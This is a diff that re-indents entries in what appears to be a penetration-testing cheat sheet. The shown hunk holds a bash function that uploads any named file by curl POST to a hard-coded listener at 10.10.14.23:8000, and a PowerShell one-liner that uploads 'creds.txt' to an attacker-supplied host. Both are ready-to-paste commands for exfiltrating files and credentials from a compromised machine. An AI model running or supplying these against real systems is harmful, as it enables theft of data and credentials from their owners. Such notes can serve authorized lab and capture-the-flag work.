@@ -23,18 +23,18 @@ functions:
           
           TIP - cp paste this function and run "get <file>"
 
-          get(){
-          file=$1
-          ip="10.10.14.23"
-          port="8000"
-          #echo $file $ip $port
-          output=$(curl -k -i -X POST -F filename=@"$file" -F name=file "http://$ip:$port")
-          if [[ "$output" == *"success"* ]]; then
-            echo "[+] Uploaded! --> $file"
-          else
-            echo "[-] Upload Failed! --> $file $ip:$port"
-          fi
-          }
+        get(){
+        file=$1
+        ip="10.10.14.23"
+        port="8000"
+        #echo $file $ip $port
+        output=$(curl -k -i -X POST -F filename=@"$file" -F name=file "http://$ip:$port")
+        if [[ "$output" == *"success"* ]]; then
+          echo "[+] Uploaded! --> $file"
+        else
+          echo "[-] Upload Failed! --> $file $ip:$port"
+        fi
+        }
           
           - - - powershell - - - 
           powershell -c (New-Object System.Net.WebClient).UploadFile('http://<ip>:<port>', 'creds.txt')
